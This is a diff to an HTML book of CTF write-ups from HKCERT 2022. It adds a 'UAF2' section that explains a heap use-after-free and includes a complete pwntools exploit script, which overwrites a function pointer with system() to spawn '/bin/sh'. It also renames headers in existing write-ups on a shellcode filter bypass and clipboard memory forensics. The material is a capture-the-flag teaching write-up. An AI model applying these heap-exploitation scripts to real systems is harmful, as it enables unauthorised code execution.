@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introducion.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">HKCERT 2022</li><li class="chapter-item expanded "><a href="hkcert22/uaf.html"><strong aria-hidden="true">1.</strong> UAF</a></li><li class="chapter-item expanded "><a href="hkcert22/shellcode_runner_2.html"><strong aria-hidden="true">2.</strong> Shellcode Runner 2</a></li><li class="chapter-item expanded "><a href="hkcert22/clipboard.html"><strong aria-hidden="true">3.</strong> Clipboard</a></li></ol>            </div>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introducion.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">HKCERT 2022</li><li class="chapter-item expanded "><a href="hkcert22/uaf.html"><strong aria-hidden="true">1.</strong> UAF</a></li><li class="chapter-item expanded "><a href="hkcert22/uaf2.html"><strong aria-hidden="true">2.</strong> UAF2</a></li><li class="chapter-item expanded "><a href="hkcert22/shellcode_runner_2.html"><strong aria-hidden="true">3.</strong> Shellcode Runner 2</a></li><li class="chapter-item expanded "><a href="hkcert22/clipboard.html"><strong aria-hidden="true">4.</strong> Clipboard</a></li><li class="chapter-item expanded "><a href="hkcert22/auction_with_blockchain.html"><strong aria-hidden="true">5.</strong> Auction with Blockchain</a></li></ol>            </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
 
@@ -146,7 +146,7 @@
                     <main>
                         <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
 <p>Hi! I am Jeff LIU. This is the write-ups of CTF challenges that I have completed.</p>
-<div style="break-before: page; page-break-before: always;"></div><p>s# UAF</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="uaf"><a class="header" href="#uaf">UAF</a></h1>
 <h2 id="challenge-details"><a class="header" href="#challenge-details">Challenge details</a></h2>
 <p><img src="hkcert22/assets/uaf_detail.png" alt="" /></p>
 <h2 id="analysis"><a class="header" href="#analysis">Analysis</a></h2>
@@ -297,8 +297,70 @@ r.interactive()
 </code></pre>
 <h2 id="flag"><a class="header" href="#flag">Flag</a></h2>
 <p><code>hkcert22{w3L1C0me_70_World_0f_pwN_h34P_z0o}</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="uaf2"><a class="header" href="#uaf2">UAF2</a></h1>
+<h2 id="challenge-details-1"><a class="header" href="#challenge-details-1">Challenge Details</a></h2>
+<p><img src="hkcert22/assets/uaf2_details.png" alt="" /></p>
+<h2 id="analysis-1"><a class="header" href="#analysis-1">Analysis</a></h2>
+<p>As the code of the challenge is similar to <a href="hkcert22/uaf.html">UAF</a> challenge, I used <code>diff</code> to find the difference to save some time.</p>
+<p><img src="hkcert22/assets/uaf2_diff.png" alt="" /></p>
+<p>You can see there are only two main differences:</p>
+<ol>
+<li>No <code>get_shell()</code> anymore but the <code>system()</code> is still used to find the current time. So, our goal this time is to modify the address of <code>speak()</code> to <code>system()</code> and the value of name to <code>/bin/sh</code></li>
+<li>The size of the name is now fixed to <code>0x18</code>. Therefore, all the chunk size will be <code>0x20</code>, which means the attack used in <a href="hkcert22/uaf.html">UAF</a> cannot be applied again.</li>
+</ol>
+<p>But after looking into the binary, something abnormal appeared:
+<img src="hkcert22/assets/uaf2_gdb.png" alt="" /></p>
+<p>Notice the fastbin show that something is corrupted. Thus, I try testing the fastbin by filling up the <code>tcache</code> with animals (each tcache bin can hold 7 chunk at maximum, so 4 animals will create 8 chunk and one chunk should go to fastbin instead).
+<img src="hkcert22/assets/uaf2_gdb.png" alt="" />
+This time the chunk did not go to fastbin. If we allocate a new animal, the 2 chunks created are not connected anymore. Hence, there should be some combination that shifted the chunk and write to the destinated region.</p>
+<p>After testing different combinations, I have come up the following solution.</p>
+<h2 id="solution-1"><a class="header" href="#solution-1">Solution</a></h2>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+context.arch = 'amd64'
+
+e = ELF('./zoo')
+r = gdb.debug('./zoo', 'b* remove_animal\nc')
+# r = remote('chal.hkcert22.pwnable.hk', 28236)
+def create(data):
+    r.sendlineafter(b'Exit\n&gt; ', b'1')
+    r.sendlineafter(b'2) Panda', b'1')
+    r.sendafter(b'animal?', data)
+
+def delete(id):
+    r.sendlineafter(b'Exit\n&gt; ', b'2')
+    r.sendlineafter(b'(0-9)', str(id).encode())
+
+def report(id):
+    r.sendlineafter(b'Exit\n&gt; ', b'3')
+    r.sendlineafter(b'(0-9)', str(id).encode())
+
+# 0 - 3
+for i in range(4):
+    create(b'A' * 0x18)
+
+# 0 - 3
+for i in range(4):
+    delete(3 - i)
+
+# 4
+create(p64(e.symbols['system']))
+
+# 5 - 8
+for i in range(4):
+    create(b'A' * 0x18)
+delete(8)
+delete(7)
+delete(5)
+delete(6)
+
+create(b'/bin/sh\0')
+report(1)
+r.interactive()
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="shellcode-runner-2"><a class="header" href="#shellcode-runner-2">Shellcode Runner 2</a></h1>
-<h2 id="challenge-detail"><a class="header" href="#challenge-detail">Challenge Detail</a></h2>
+<h2 id="challenge-details-2"><a class="header" href="#challenge-details-2">Challenge Details</a></h2>
 <p><img src="hkcert22/assets/shellcode_runner2_details.png" alt="" /></p>
 <p>source:</p>
 <pre><code class="language-c">#include &lt;unistd.h&gt;
@@ -391,7 +453,7 @@ int main() {
     ((void_fn) shellcode)();
 }
 </code></pre>
-<h2 id="solution-1"><a class="header" href="#solution-1">Solution</a></h2>
+<h2 id="solution-2"><a class="header" href="#solution-2">Solution</a></h2>
 <p>You can see the shellcode will be checked using the <code>is_all_upper()</code> function, which means that only upper case alphanumerical input is accpeted. </p>
 <p>After searching on the Internet, I found several example of uppercase alphanumerical shellcodes. However, all of the suggested shellcodes are larger than 100 bytes. Hence, they cannot be used directly.</p>
 <p>Later, I further investigated into the <code>is_all_upper()</code>. I found that the size of shellcode is checked using <code>strlen()</code>, which means that the checking will end if it sees the <code>0x00</code> characters. As <code>read</code> function does not stop at any null byte, I can include a null byte to stop the checking and append the normal shellcode at the end of the null byte.</p>
@@ -411,9 +473,9 @@ r.interactive()
 <h2 id="flag-1"><a class="header" href="#flag-1">Flag</a></h2>
 <p><code>hkcert22{d41d8cd98f00b204e9800998ecf8427e33a}</code></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="clipboard"><a class="header" href="#clipboard">Clipboard</a></h1>
-<h2 id="challenge-detail-1"><a class="header" href="#challenge-detail-1">Challenge Detail</a></h2>
+<h2 id="challenge-details-3"><a class="header" href="#challenge-details-3">Challenge Details</a></h2>
 <p><img src="hkcert22/assets/clipboard_detail.png" alt="" /></p>
-<h2 id="solution-2"><a class="header" href="#solution-2">Solution</a></h2>
+<h2 id="solution-3"><a class="header" href="#solution-3">Solution</a></h2>
 <p>The zip file contains a <code>Windows 7 x64.mem</code> file. I guessed this file is the memory dump of a Windows 7 machine. As the title and description of the challenge implies that the secret is inside the clipboard of the machine, we need to peek into the data of clipboard using <code>Volatility</code>.</p>
 <p>The file name implies that it is a Windows 7 x64 machine. Thus, I used the <code>Win7SP1x64</code> profile:</p>
 <pre><code class="language-bash">python2 vol.py -f Windows\ 7\ x64.mem --profile=Win7SP1x64 clipboard -v
@@ -471,6 +533,8 @@ with open('result.rtf', 'w') as f:
 <h2 id="flag-2"><a class="header" href="#flag-2">Flag</a></h2>
 <pre><code>hkcert22{f0r3ns1c_1s_fun_t0_p14y_w1th}
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="auction-with-blockchain"><a class="header" href="#auction-with-blockchain">Auction with Blockchain</a></h1>
+<h1 id="challenge-details-4"><a class="header" href="#challenge-details-4">Challenge Details</a></h1>
 
                     </main>
 
